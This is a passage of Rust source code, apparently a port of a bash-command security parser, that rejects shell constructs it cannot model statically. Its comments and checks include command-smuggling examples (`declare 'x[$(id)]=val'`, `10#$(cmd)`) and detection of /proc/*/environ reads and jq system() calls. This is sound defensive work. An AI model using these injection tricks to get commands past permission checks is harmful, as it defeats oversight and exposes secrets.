        // `export`/`local`/`readonly`/`declare`/`typeset`.
        let mut argv: Vec<String> = Vec::new();
        for child in children(node) {
            match child.kind() {
                "export" | "local" | "readonly" | "declare" | "typeset" => {
                    argv.push(node_text(child, src).to_string());
                }
                "word" | "number" | "raw_string" | "string" | "concatenation" => {
                    let arg = match walk_argument(Some(child), src, commands, var_scope) {
                        Ok(s) => s,
                        Err(e) => return Some(e),
                    };
                    // SECURITY: declare/typeset/local flags that change assignment
                    // semantics (-n nameref, -i integer, -a/-A array) break the
                    // static model. Check the RESOLVED arg.
                    if (argv.first().map(String::as_str) == Some("declare")
                        || argv.first().map(String::as_str) == Some("typeset")
                        || argv.first().map(String::as_str) == Some("local"))
                        && declare_flag_re().is_match(&arg)
                    {
                        return Some(ParseForSecurityResult::TooComplex {
                            reason: format!(
                                "declare flag {arg} changes assignment semantics (nameref/integer/array)"
                            ),
                        });
                    }
                    // SECURITY: bare positional with a subscript also evaluates
                    // (`declare 'x[$(id)]=val'` runs $(id) in the subscript).
                    if (argv.first().map(String::as_str) == Some("declare")
                        || argv.first().map(String::as_str) == Some("typeset")
                        || argv.first().map(String::as_str) == Some("local"))
                        && !arg.starts_with('-')
                        && declare_subscript_re().is_match(&arg)
                    {
                        return Some(ParseForSecurityResult::TooComplex {
                            reason: format!(
                                "declare positional '{arg}' contains array subscript — bash evaluates $(cmd) in subscripts"
                            ),
                        });
                    }
                    argv.push(arg);
                }
                "variable_assignment" => {
                    let ev = match walk_variable_assignment(child, commands, var_scope, src) {
                        Ok(ev) => ev,
                        Err(e) => return Some(e),
                    };
                    // export/declare assignments populate the scope so later $VAR
                    // refs resolve.
                    let pair = format!("{}={}", ev.name, ev.value);
                    apply_var_to_scope(var_scope, &ev.name, &ev.value, ev.is_append);
                    argv.push(pair);
                }
                "variable_name" => {
                    // `export FOO` — bare name, no assignment.
                    argv.push(node_text(child, src).to_string());
                }
                _ => return Some(too_complex(child)),
            }
        }
        commands.push(SimpleCommand {
            argv,
            env_vars: Vec::new(),
            redirects: Vec::new(),
            text: node_text(node, src).to_string(),
        });
        return None;
    }

    if kind == "variable_assignment" {
        // Bare `VAR=value` at statement level — inert, no command pushed.
        let ev = match walk_variable_assignment(node, commands, var_scope, src) {
            Ok(ev) => ev,
            Err(e) => return Some(e),
        };
        apply_var_to_scope(var_scope, &ev.name, &ev.value, ev.is_append);
        return None;
    }

    if kind == "for_statement" {
        let mut loop_var: Option<String> = None;
        let mut do_group: Option<Node> = None;
        for child in children(node) {
            match child.kind() {
                "variable_name" => loop_var = Some(node_text(child, src).to_string()),
                "do_group" => do_group = Some(child),
                "for" | "in" | "select" | ";" => {}
                "command_substitution" => {
                    if let Some(err) =
                        collect_command_substitution(child, commands, var_scope, src)
                    {
                        return Some(err);
                    }
                }
                _ => {
                    // Iteration values: validated (value discarded; body uses
                    // VAR_PLACEHOLDER regardless).
                    if let Err(e) = walk_argument(Some(child), src, commands, var_scope) {
                        return Some(e);
                    }
                }
            }
        }
        let (loop_var, do_group) = match (loop_var, do_group) {
            (Some(v), Some(g)) => (v, g),
            _ => return Some(too_complex(node)),
        };
        // SECURITY: PS4/IFS as loop var bypasses assignment validation.
        if loop_var == "PS4" || loop_var == "IFS" {
            return Some(ParseForSecurityResult::TooComplex {
                reason: format!("{loop_var} as loop variable bypasses assignment validation"),
            });
        }
        // Loop var is ALWAYS unknown-value (VAR_PLACEHOLDER) in the REAL scope;
        // body uses a COPY so body assignments don't leak past `done`.
        var_scope.insert(loop_var, VAR_PLACEHOLDER.to_string());
        let mut body_scope = var_scope.clone();
        for c in children(do_group) {
            if matches!(c.kind(), "do" | "done" | ";") {
                continue;
            }
            if let Some(err) = collect_commands(c, commands, &mut body_scope, src) {
                return Some(err);
            }
        }
        return None;
    }

    if kind == "if_statement" || kind == "while_statement" {
        let mut seen_then = false;
        for child in children(node) {
            match child.kind() {
                "if" | "fi" | "else" | "elif" | "while" | "until" | ";" => continue,
                "then" => {
                    seen_then = true;
                    continue;
                }
                "do_group" => {
                    // while body: scope COPY (body assignments don't leak past
                    // done); inherits any `read VAR` tracking already in the real
                    // scope from the condition.
                    let mut body_scope = var_scope.clone();
                    for c in children(child) {
                        if matches!(c.kind(), "do" | "done" | ";") {
                            continue;
                        }
                        if let Some(err) = collect_commands(c, commands, &mut body_scope, src) {
                            return Some(err);
                        }
                    }
                    continue;
                }
                "elif_clause" | "else_clause" => {
                    let mut branch_scope = var_scope.clone();
                    for c in children(child) {
                        if matches!(c.kind(), "elif" | "else" | "then" | ";") {
                            continue;
                        }
                        if let Some(err) = collect_commands(c, commands, &mut branch_scope, src) {
                            return Some(err);
                        }
                    }
                    continue;
                }
                _ => {}
            }
            // Condition (seen_then=false) uses REAL varScope; then-body uses a COPY.
            let before = commands.len();
            if seen_then {
                let mut copy = var_scope.clone();
                if let Some(err) = collect_commands(child, commands, &mut copy, src) {
                    return Some(err);
                }
            } else {
                if let Some(err) = collect_commands(child, commands, var_scope, src) {
                    return Some(err);
                }
                // `while read VAR`: track condition `read VAR` names in REAL scope
                // (value UNKNOWN → VAR_PLACEHOLDER) so the body COPY inherits them.
                for i in before..commands.len() {
                    let c = &commands[i];
                    if c.argv.first().map(String::as_str) != Some("read") {
                        continue;
                    }
                    let names: Vec<String> = c.argv[1..]
                        .iter()
                        .filter(|a| {
                            !a.starts_with('-') && valid_var_name_re().is_match(a)
                        })
                        .cloned()
                        .collect();
                    for a in names {
                        // SECURITY: fail closed when a tracked literal would be
                        // overwritten by a `read` that may not execute.
                        if let Some(existing) = var_scope.get(&a) {
                            if !contains_any_placeholder(existing) {
                                return Some(ParseForSecurityResult::TooComplex {
                                    reason: format!(
                                        "'read {a}' in condition may not execute (||/pipeline/subshell); cannot prove it overwrites tracked literal '{existing}'"
                                    ),
                                });
                            }
                        }
                        var_scope.insert(a, VAR_PLACEHOLDER.to_string());
                    }
                }
            }
        }
        return None;
    }

    if kind == "subshell" {
        // `(cmd1; cmd2)` — isolated scope. Use a COPY of varScope.
        let mut inner_scope = var_scope.clone();
        for child in children(node) {
            if matches!(child.kind(), "(" | ")") {
                continue;
            }
            if let Some(err) = collect_commands(child, commands, &mut inner_scope, src) {
                return Some(err);
            }
        }
        return None;
    }

    if kind == "test_command" {
        // `[[ EXPR ]]` / `[ EXPR ]` — push synthetic command with argv[0]='[['.
        let mut argv: Vec<String> = vec!["[[".to_string()];
        for child in children(node) {
            if matches!(child.kind(), "[[" | "]]" | "[" | "]") {
                continue;
            }
            if let Some(err) = walk_test_expr(child, src, &mut argv, commands, var_scope) {
                return Some(err);
            }
        }
        commands.push(SimpleCommand {
            argv,
            env_vars: Vec::new(),
            redirects: Vec::new(),
            text: node_text(node, src).to_string(),
        });
        return None;
    }

    if kind == "unset_command" {
        // `unset FOO BAR`, `unset -f func`. Safe — only removes vars/functions.
        let mut argv: Vec<String> = Vec::new();
        for child in children(node) {
            match child.kind() {
                "unset" => argv.push(node_text(child, src).to_string()),
                "variable_name" => {
                    let name = node_text(child, src).to_string();
                    argv.push(name.clone());
                    // SECURITY: remove from varScope so later `$VAR` rejects.
                    var_scope.remove(&name);
                }
                "word" => {
                    let arg = match walk_argument(Some(child), src, commands, var_scope) {
                        Ok(s) => s,
                        Err(e) => return Some(e),
                    };
                    argv.push(arg);
                }
                _ => return Some(too_complex(child)),
            }
        }
        commands.push(SimpleCommand {
            argv,
            env_vars: Vec::new(),
            redirects: Vec::new(),
            text: node_text(node, src).to_string(),
        });
        return None;
    }

    Some(too_complex(node))
}

/// TS `walkRedirectedStatement` (ast.ts:1017). A `redirected_statement` wraps a
/// command (or pipeline) plus `file_redirect`/`heredoc_redirect` children.
/// Extract redirects, walk the inner command, attach redirects to the LAST
/// command. `None` = ok; `Some(err)` = fail-closed.
#[allow(dead_code)]
pub(crate) fn walk_redirected_statement(
    node: Node,
    commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
    src: &[u8],
) -> Option<ParseForSecurityResult> {
    let mut redirects: Vec<Redirect> = Vec::new();
    let mut inner_command: Option<Node> = None;

    for child in children(node) {
        match child.kind() {
            "file_redirect" => match walk_file_redirect(child, src, commands, var_scope) {
                Ok(r) => redirects.push(r),
                Err(e) => return Some(e),
            },
            "heredoc_redirect" => {
                if let Some(r) = walk_heredoc_redirect(child, src) {
                    return Some(r);
                }
            }
            "command" | "pipeline" | "list" | "negated_command" | "declaration_command"
            | "unset_command" => {
                inner_command = Some(child);
            }
            _ => return Some(too_complex(child)),
        }
    }

    let inner_command = match inner_command {
        Some(c) => c,
        None => {
            // `> file` alone — represent as a command with empty argv.
            commands.push(SimpleCommand {
                argv: Vec::new(),
                env_vars: Vec::new(),
                redirects,
                text: node_text(node, src).to_string(),
            });
            return None;
        }
    };

    let before = commands.len();
    if let Some(err) = collect_commands(inner_command, commands, var_scope, src) {
        return Some(err);
    }
    if commands.len() > before && !redirects.is_empty() {
        if let Some(last) = commands.last_mut() {
            last.redirects.extend(redirects);
        }
    }
    None
}

/// TS `walkFileRedirect` (ast.ts:1071). Extract operator + target from a
/// `file_redirect` node. The target must be a static word/string. `Ok(Redirect)`
/// on success; `Err(TooComplex)` fail-closed.
#[allow(dead_code)]
pub(crate) fn walk_file_redirect(
    node: Node,
    src: &[u8],
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
) -> Result<Redirect, ParseForSecurityResult> {
    let mut op: Option<String> = None;
    let mut target: Option<String> = None;
    let mut fd: Option<i64> = None;

    for child in children(node) {
        let ck = child.kind();
        if ck == "file_descriptor" {
            fd = node_text(child, src).parse::<i64>().ok();
        } else if REDIRECT_OPS.contains(&ck) {
            op = Some(ck.to_string());
        } else if ck == "word" || ck == "number" {
            // SECURITY: `number` nodes can carry expansion children via the
            // `NN#<expansion>` quirk. Plain word/number have zero children.
            if !children(child).is_empty() {
                return Err(too_complex(child));
            }
            if brace_expansion_re().is_match(node_text(child, src)) {
                return Err(too_complex(child));
            }
            // Bash quote removal: `\X` → `X` (JS `/\\(.)/g`, `.` excludes \n).
            target = Some(unescape_word(node_text(child, src)));
        } else if ck == "raw_string" {
            target = Some(strip_raw_string(node_text(child, src)));
        } else if ck == "string" {
            match walk_string(child, src, inner_commands, var_scope) {
                Ok(s) => target = Some(s),
                Err(e) => return Err(e),
            }
        } else if ck == "concatenation" {
            match walk_argument(Some(child), src, inner_commands, var_scope) {
                Ok(s) => target = Some(s),
                Err(e) => return Err(e),
            }
        } else {
            return Err(too_complex(child));
        }
    }

    match (op, target) {
        (Some(op), Some(target)) => Ok(Redirect { op, target, fd }),
        _ => Err(ParseForSecurityResult::TooComplex {
            reason: "Unrecognized redirect shape".to_string(),
        }),
    }
}

/// TS `walkCommand` (ast.ts:1237). Walk a `command` node and extract argv /
/// env_vars / redirects via the L2 walkers. Any child type not explicitly
/// handled → `too_complex` (over-ask). Rebuilds `.text` from argv when a `$VAR`
/// was resolved or a newline is present (rule-matching fidelity).
#[allow(dead_code)]
pub(crate) fn walk_command(
    node: Node,
    extra_redirects: &[Redirect],
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
    src: &[u8],
) -> ParseForSecurityResult {
    let mut argv: Vec<String> = Vec::new();
    let mut env_vars: Vec<(String, String)> = Vec::new();
    let mut redirects: Vec<Redirect> = extra_redirects.to_vec();

    for child in children(node) {
        match child.kind() {
            "variable_assignment" => {
                // SECURITY: env-prefix assignments (`VAR=x cmd`) are command-local
                // in bash — do NOT add to the global varScope.
                match walk_variable_assignment(child, inner_commands, var_scope, src) {
                    Ok(ev) => env_vars.push((ev.name, ev.value)),
                    Err(e) => return e,
                }
            }
            "command_name" => {
                let first = children(child).into_iter().next().unwrap_or(child);
                match walk_argument(Some(first), src, inner_commands, var_scope) {
                    Ok(s) => argv.push(s),
                    Err(e) => return e,
                }
            }
            "word" | "number" | "raw_string" | "string" | "concatenation"
            | "arithmetic_expansion" => {
                match walk_argument(Some(child), src, inner_commands, var_scope) {
                    Ok(s) => argv.push(s),
                    Err(e) => return e,
                }
            }
            // NOTE: bare command_substitution at arg position is INTENTIONALLY
            // unhandled → default → too_complex (the $() output IS the argument).
            "simple_expansion" => {
                match resolve_simple_expansion(child, src, var_scope, false) {
                    Ok(s) => argv.push(s),
                    Err(e) => return e,
                }
            }
            "file_redirect" => match walk_file_redirect(child, src, inner_commands, var_scope) {
                Ok(r) => redirects.push(r),
                Err(e) => return e,
            },
            "herestring_redirect" => {
                if let Some(e) =
                    walk_herestring_redirect(child, src, inner_commands, var_scope)
                {
                    return e;
                }
            }
            _ => return too_complex(child),
        }
    }

    // SECURITY: rebuild .text from argv when node.text contains `$<ident>` (a
    // resolved simple_expansion) or a newline (line continuations). Shell-escape
    // each arg. See ast.ts:1316-1358 for the deny-rule-matching rationale.
    let raw = node_text(node, src);
    let text = if dollar_ident_re().is_match(raw) || raw.contains('\n') {
        argv.iter()
            .map(|a| {
                if a.is_empty() || shell_escape_re().is_match(a) {
                    format!("'{}'", a.replace('\'', "'\\''"))
                } else {
                    a.clone()
                }
            })
            .collect::<Vec<_>>()
            .join(" ")
    } else {
        raw.to_string()
    };

    ParseForSecurityResult::Simple {
        commands: vec![SimpleCommand {
            argv,
            env_vars,
            redirects,
            text,
        }],
    }
}

/// TS `collectCommandSubstitution` (ast.ts:1374). Recurse a `$()` node's inner
/// command(s) into `inner_commands`. Outer vars are visible inside (subshell
/// semantics) but inner assignments must NOT leak — so the outer scope is CLONED
/// and the clone threaded; the caller's `var_scope` is never mutated.
#[allow(dead_code)]
pub(crate) fn collect_command_substitution(
    cs_node: Node,
    inner_commands: &mut Vec<SimpleCommand>,
    outer_scope: &HashMap<String, String>,
    src: &[u8],
) -> Option<ParseForSecurityResult> {
    let mut inner_scope = outer_scope.clone();
    for child in children(cs_node) {
        if matches!(child.kind(), "$(" | "`" | ")") {
            continue;
        }
        if let Some(err) = collect_commands(child, inner_commands, &mut inner_scope, src) {
            return Some(err);
        }
    }
    None
}

/// TS `walkArgument` (ast.ts:1399). Convert an argument node to its resolved
/// literal string (the argument-position allowlist). `Ok(s)` = resolved value;
/// `Err(TooComplex)` = fail-closed. A bare `command_substitution` falls to the
/// default arm → too-complex INTENTIONALLY (the `$()` output IS the argument).
#[allow(dead_code)]
pub(crate) fn walk_argument(
    node: Option<Node>,
    src: &[u8],
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
) -> Result<String, ParseForSecurityResult> {
    let node = match node {
        Some(n) => n,
        None => {
            return Err(ParseForSecurityResult::TooComplex {
                reason: "Null argument node".to_string(),
            })
        }
    };
    match node.kind() {
        "word" => {
            // bash quote removal: `\X` → `X` for any char X — EXCEPT JS `/\\(.)/g`
            // where `.` does not match a newline, so `\<NL>` is NOT collapsed.
            if brace_expansion_re().is_match(node_text(node, src)) {
                return Err(ParseForSecurityResult::TooComplex {
                    reason: "Word contains brace expansion syntax".to_string(),
                });
            }
            Ok(unescape_word(node_text(node, src)))
        }
        "number" => {
            // SECURITY: `10#$(cmd)` parses as a `number` node WITH a child
            // (command_substitution). Plain numbers (`10`, `16#ff`) have zero
            // children.
            if !children(node).is_empty() {
                return Err(ParseForSecurityResult::TooComplex {
                    reason: "Number node contains expansion (NN# arithmetic base syntax)"
                        .to_string(),
                });
            }
            Ok(node_text(node, src).to_string())
        }
        "raw_string" => Ok(strip_raw_string(node_text(node, src))),
        "string" => walk_string(node, src, inner_commands, var_scope),
        "concatenation" => {
            if brace_expansion_re().is_match(node_text(node, src)) {
                return Err(ParseForSecurityResult::TooComplex {
                    reason: "Brace expansion".to_string(),
                });
            }
            let mut result = String::new();
            for child in children(node) {
                let part = walk_argument(Some(child), src, inner_commands, var_scope)?;
                result.push_str(&part);
            }
            Ok(result)
        }
        "arithmetic_expansion" => {
            if let Some(err) = walk_arithmetic(node, src) {
                return Err(err);
            }
            Ok(node_text(node, src).to_string())
        }
        // `$VAR` in a concatenation / bare counts as a bare arg (inside_string=false).
        "simple_expansion" => resolve_simple_expansion(node, src, var_scope, false),
        // command_substitution at arg position is INTENTIONALLY unhandled → reject.
        _ => Err(too_complex(node)),
    }
}

/// Unquoted-word backslash removal (TS `/\\(.)/g` in walkArgument, ast.ts:1425).
/// Drop a backslash and keep the following char — EXCEPT when that char is a
/// newline (JS `.` excludes `\n`): there the backslash stays literal. A trailing
/// lone backslash also stays.
fn unescape_word(s: &str) -> String {
    let chars: Vec<char> = s.chars().collect();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '\\' && i + 1 < chars.len() && chars[i + 1] != '\n' {
            out.push(chars[i + 1]);
            i += 2;
        } else {
            out.push(chars[i]);
            i += 1;
        }
    }
    out
}

/// Double-quoted `string_content` backslash removal (TS `/\\([$`"\\])/g`,
/// ast.ts:1552). A backslash is dropped ONLY before `$ ` " \`; every other
/// sequence (e.g. `\n`) stays literal. Distinct from [`unescape_word`].
fn unescape_string_content(s: &str) -> String {
    let chars: Vec<char> = s.chars().collect();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '\\'
            && i + 1 < chars.len()
            && matches!(chars[i + 1], '$' | '`' | '"' | '\\')
        {
            out.push(chars[i + 1]);
            i += 2;
        } else {
            out.push(chars[i]);
            i += 1;
        }
    }
    out
}

/// TS `walkString` (ast.ts:1508). Extract literal content from a double-quoted
/// `string` node, gap-filling dropped literal newlines (tree-sitter drops literal
/// `\n` inside `"…"`) and tracking literal-vs-dynamic content for the two
/// post-loop solo-placeholder / whitespace-only guards.
#[allow(dead_code)]
pub(crate) fn walk_string(
    node: Node,
    src: &[u8],
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
) -> Result<String, ParseForSecurityResult> {
    let mut result = String::new();
    let mut cursor: i64 = -1;
    let mut saw_dynamic = false;
    let mut saw_literal = false;
    for child in children(node) {
        // Index gap = dropped literal newline(s). Skipped before the first child
        // (cursor == -1) and before a `"` delimiter (whitespace-only quirk).
        if cursor != -1 && (child.start_byte() as i64) > cursor && child.kind() != "\"" {
            let gap = (child.start_byte() as i64 - cursor) as usize;
            result.push_str(&"\n".repeat(gap));
            saw_literal = true;
        }
        cursor = child.end_byte() as i64;
        match child.kind() {
            "\"" => {
                cursor = child.end_byte() as i64;
            }
            "string_content" => {
                result.push_str(&unescape_string_content(node_text(child, src)));
                saw_literal = true;
            }
            // DOLLAR: a bare literal `$` (node kind "$") before a non-name char.
            "$" => {
                result.push('$');
                saw_literal = true;
            }
            "command_substitution" => match extract_safe_cat_heredoc(child, src) {
                CatHeredoc::Dangerous => return Err(too_complex(child)),
                CatHeredoc::Body(body) => {
                    // bash $() strips ALL trailing newlines.
                    let trimmed = body.trim_end_matches('\n');
                    if trimmed.contains('\n') {
                        // Multi-line body: drop (avoid NEWLINE_HASH FP) but it IS
                        // literal content.
                        saw_literal = true;
                    } else {
                        result.push_str(trimmed);
                        saw_literal = true;
                    }
                }
                CatHeredoc::None => {
                    if let Some(err) =
                        collect_command_substitution(child, inner_commands, var_scope, src)
                    {
                        return Err(err);
                    }
                    result.push_str(CMDSUB_PLACEHOLDER);
                    saw_dynamic = true;
                }
            },
            "simple_expansion" => {
                let v = resolve_simple_expansion(child, src, var_scope, true)?;
                if v == VAR_PLACEHOLDER {
                    saw_dynamic = true;
                } else {
                    saw_literal = true;
                }
                result.push_str(&v);
            }
            "arithmetic_expansion" => {
                if let Some(err) = walk_arithmetic(child, src) {
                    return Err(err);
                }
                result.push_str(node_text(child, src));
                saw_literal = true;
            }
            // expansion (${…}) inside "…" and anything else → reject.
            _ => return Err(too_complex(child)),
        }
    }
    // Guard A: solo-placeholder string (`"$(cmd)"` / `"$VAR"`) → reject.
    if saw_dynamic && !saw_literal {
        return Err(too_complex(node));
    }
    // Guard B: whitespace-only-string quirk — no content children but the source
    // span is longer than bare `""` (text byte-len > 2).
    let text_len = node.end_byte() - node.start_byte();
    if !saw_literal && !saw_dynamic && text_len > 2 {
        return Err(too_complex(node));
    }
    Ok(result)
}

/// TS `walkArithmetic` (ast.ts:1675). Validate an `arithmetic_expansion` node:
/// only literal numeric expressions (no variables, no substitutions). `None` =
/// safe; `Some(TooComplex)` = reject (arithmetic injection defense). The caller
/// stores the full `$((…))` span as a literal argv string on success.
#[allow(dead_code)]
pub(crate) fn walk_arithmetic(node: Node, src: &[u8]) -> Option<ParseForSecurityResult> {
    for child in children(node) {
        if children(child).is_empty() {
            let t = node_text(child, src);
            if !arith_leaf_re().is_match(t) {
                return Some(ParseForSecurityResult::TooComplex {
                    reason: format!("Arithmetic expansion references variable or non-literal: {t}"),
                });
            }
            continue;
        }
        match child.kind() {
            "binary_expression" | "unary_expression" | "ternary_expression"
            | "parenthesized_expression" => {
                if let Some(err) = walk_arithmetic(child, src) {
                    return Some(err);
                }
            }
            _ => return Some(too_complex(child)),
        }
    }
    None
}

/// TS `extractSafeCatHeredoc` (ast.ts:1721). Is `sub_node` exactly
/// `$(cat <<'DELIM' … DELIM)`? Returns the body if so, [`CatHeredoc::Dangerous`]
/// on a `/proc/*/environ` or jq `system(` body, else [`CatHeredoc::None`].
#[allow(dead_code)]
pub(crate) fn extract_safe_cat_heredoc(sub_node: Node, src: &[u8]) -> CatHeredoc {
    // Expect exactly: $( + one redirected_statement + )
    let mut stmt: Option<Node> = None;
    for child in children(sub_node) {
        if matches!(child.kind(), "$(" | ")") {
            continue;
        }
        if child.kind() == "redirected_statement" && stmt.is_none() {
            stmt = Some(child);
        } else {
            return CatHeredoc::None;
        }
    }
    let stmt = match stmt {
        Some(s) => s,
        None => return CatHeredoc::None,
    };

    let mut saw_cat = false;
    let mut body: Option<String> = None;
    for child in children(stmt) {
        match child.kind() {
            "command" => {
                let cmd_children = children(child);
                if cmd_children.len() != 1 {
                    return CatHeredoc::None;
                }
                let name_node = cmd_children[0];
                if name_node.kind() != "command_name" || node_text(name_node, src) != "cat" {
                    return CatHeredoc::None;
                }
                saw_cat = true;
            }
            "heredoc_redirect" => {
                if walk_heredoc_redirect(child, src).is_some() {
                    return CatHeredoc::None;
                }
                for hc in children(child) {
                    if hc.kind() == "heredoc_body" {
                        body = Some(node_text(hc, src).to_string());
                    }
                }
            }
            _ => return CatHeredoc::None,
        }
    }

    let body = match (saw_cat, body) {
        (true, Some(b)) => b,
        _ => return CatHeredoc::None,
    };
    if proc_environ_re().is_match(&body) {
        return CatHeredoc::Dangerous;
    }
    if jq_system_re().is_match(&body) {
        return CatHeredoc::Dangerous;
    }
    CatHeredoc::Body(body)
}

/// TS `walkVariableAssignment` (ast.ts:1777). Extract a `name=value` / `+=`
/// assignment, validating the name and the PS4/IFS/tilde fail-closed guards.
/// `Ok(VarAssign)` = the assignment; `Err(TooComplex)` = reject.
#[allow(dead_code)]
pub(crate) fn walk_variable_assignment(
    node: Node,
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
    src: &[u8],
) -> Result<VarAssign, ParseForSecurityResult> {
    let mut name: Option<String> = None;
    let mut value = String::new();
    let mut is_append = false;

    for child in children(node) {
        match child.kind() {
            "variable_name" => name = Some(node_text(child, src).to_string()),
            "=" | "+=" => {
                is_append = child.kind() == "+=";
            }
            "command_substitution" => {
                if let Some(err) =
                    collect_command_substitution(child, inner_commands, var_scope, src)
                {
                    return Err(err);
                }
                value = CMDSUB_PLACEHOLDER.to_string();
            }
            // RHS of an assignment does NOT word-split/glob → resolve as if inside
            // a string so BARE_VAR_UNSAFE_RE doesn't over-reject.
            "simple_expansion" => {
                value = resolve_simple_expansion(child, src, var_scope, true)?;
            }
            _ => {
                value = walk_argument(Some(child), src, inner_commands, var_scope)?;
            }
        }
    }

    let name = match name {
        Some(n) => n,
        None => {
            return Err(ParseForSecurityResult::TooComplex {
                reason: "Variable assignment without name".to_string(),
            })
        }
    };
    // SECURITY: tree-sitter accepts invalid names (e.g. `1VAR=value`) bash runs as
    // a COMMAND — must not treat as inert assignment.
    if !valid_var_name_re().is_match(&name) {
        return Err(ParseForSecurityResult::TooComplex {
            reason: format!("Invalid variable name (bash treats as command): {name}"),
        });
    }
    // SECURITY: IFS changes word-splitting — cannot model statically.
    if name == "IFS" {
        return Err(ParseForSecurityResult::TooComplex {
            reason: "IFS assignment changes word-splitting — cannot model statically".to_string(),
        });
    }
    // SECURITY: PS4 is expanded at trace time after `set -x` — allowlist only.
    if name == "PS4" {
        if is_append {
            return Err(ParseForSecurityResult::TooComplex {
                reason:
                    "PS4 += cannot be statically verified — combine into a single PS4= assignment"
                        .to_string(),
            });
        }
        if contains_any_placeholder(&value) {
            return Err(ParseForSecurityResult::TooComplex {
                reason: "PS4 value derived from cmdsub/variable — runtime unknowable".to_string(),
            });
        }
        let stripped = ps4_dollar_brace_re().replace_all(&value, "");
        if !ps4_charset_re().is_match(&stripped) {
            return Err(ParseForSecurityResult::TooComplex {
                reason:
                    "PS4 value outside safe charset — only ${VAR} refs and [A-Za-z0-9 _+:.=/[]-] allowed"
                        .to_string(),
            });
        }
    }
    // SECURITY: tilde may expand at assignment time — reject any `~` in value.
    if value.contains('~') {
        return Err(ParseForSecurityResult::TooComplex {
            reason: "Tilde in assignment value — bash may expand at assignment time".to_string(),
        });
    }
    Ok(VarAssign {
        name,
        value,
        is_append,
    })
}

/// TS `walkHeredocRedirect` (ast.ts:1143). Only quoted-delimiter heredocs
/// (`<<'EOF'`) are safe (literal body). `None` = ok; `Some(TooComplex)` = reject.
/// ALL unquoted heredocs reject (tree-sitter grammar gap: backticks in an
/// unquoted body are not parsed as command_substitution but bash executes them).
#[allow(dead_code)]
pub(crate) fn walk_heredoc_redirect(node: Node, src: &[u8]) -> Option<ParseForSecurityResult> {
    let mut start_text: Option<String> = None;
    let mut body: Option<Node> = None;
    for child in children(node) {
        match child.kind() {
            "heredoc_start" => start_text = Some(node_text(child, src).to_string()),
            "heredoc_body" => body = Some(child),
            "<<" | "<<-" | "heredoc_end" | "file_descriptor" => {}
            _ => return Some(too_complex(child)),
        }
    }
    let is_quoted = start_text.as_deref().is_some_and(|s| {
        (s.starts_with('\'') && s.ends_with('\''))
            || (s.starts_with('"') && s.ends_with('"'))
            || s.starts_with('\\')
    });
    if !is_quoted {
        return Some(ParseForSecurityResult::TooComplex {
            reason: "Heredoc with unquoted delimiter undergoes shell expansion".to_string(),
        });
    }
    if let Some(b) = body {
        for hc in children(b) {
            if hc.kind() != "heredoc_content" {
                return Some(too_complex(hc));
            }
        }
    }
    None
}

/// TS `walkHerestringRedirect` (ast.ts:1211). `<<< content` — content is stdin,
/// not argv; validate it's statically resolvable (discard the string) and reject
/// a `\n…#` pattern (NEWLINE_HASH invariant). `None` = ok.
#[allow(dead_code)]
pub(crate) fn walk_herestring_redirect(
    node: Node,
    src: &[u8],
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
) -> Option<ParseForSecurityResult> {
    for child in children(node) {
        if child.kind() == "<<<" {
            continue;
        }
        match walk_argument(Some(child), src, inner_commands, var_scope) {
            Ok(content) => {
                if newline_hash_re().is_match(&content) {
                    return Some(too_complex(child));
                }
            }
            Err(e) => return Some(e),
        }
    }
    None
}

/// TS `walkTestExpr` (ast.ts:962). Walk a `[[ … ]]` test-expression subtree,
/// pushing operator tokens / operands onto `argv`. `None` = ok; operand
/// validation propagates any [`walk_argument`] too-complex.
#[allow(dead_code)]
pub(crate) fn walk_test_expr(
    node: Node,
    src: &[u8],
    argv: &mut Vec<String>,
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
) -> Option<ParseForSecurityResult> {
    match node.kind() {
        "unary_expression" | "binary_expression" | "negated_expression"
        | "parenthesized_expression" => {
            for c in children(node) {
                if let Some(err) = walk_test_expr(c, src, argv, inner_commands, var_scope) {
                    return Some(err);
                }
            }
            None
        }
        "test_operator" | "!" | "(" | ")" | "&&" | "||" | "==" | "=" | "!=" | "<" | ">"
        | "=~" | "regex" | "extglob_pattern" => {
            argv.push(node_text(node, src).to_string());
            None
        }
        _ => match walk_argument(Some(node), src, inner_commands, var_scope) {
            Ok(s) => {
                argv.push(s);
                None
            }
            Err(e) => Some(e),
        },
    }
}

/// Mask `{` characters inside single-/double-quoted spans (TS
/// `maskBracesInQuotedContexts`, `ast.ts:331`). A single-pass bash-aware quote
/// scanner: `'` toggles single-quote only when unquoted; `"` toggles
/// double-quote only outside single quotes; `\` escapes the next char (unquoted)
/// or `"`/`\` (inside double quotes). `{` inside a quote → space.
#[must_use]
fn mask_braces_in_quoted_contexts(cmd: &str) -> String {
    if !cmd.contains('{') {
        return cmd.to_string();
    }
    let chars: Vec<char> = cmd.chars().collect();
    let mut out = String::with_capacity(cmd.len());
    let mut in_single = false;
    let mut in_double = false;
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if in_single {
            if c == '\'' {
                in_single = false;
            }
            out.push(if c == '{' { ' ' } else { c });
            i += 1;
        } else if in_double {
            if c == '\\' && i + 1 < chars.len() && (chars[i + 1] == '"' || chars[i + 1] == '\\') {
                out.push(c);
                out.push(chars[i + 1]);
                i += 2;
            } else {
                if c == '"' {
                    in_double = false;
                }
                out.push(if c == '{' { ' ' } else { c });
                i += 1;
            }
        } else if c == '\\' && i + 1 < chars.len() {
            out.push(c);
            out.push(chars[i + 1]);
            i += 2;
        } else {
            if c == '\'' {
                in_single = true;
            } else if c == '"' {
                in_double = true;
            }
            out.push(c);
            i += 1;
        }
    }
    out
}

/// The pre-check gate of `parseForSecurityFromAst` (`ast.ts:408-437`): the
/// regex differentials that run BEFORE trusting tree-sitter. Returns the
/// byte-faithful `too-complex` reason when one fires, else `None` (proceed to
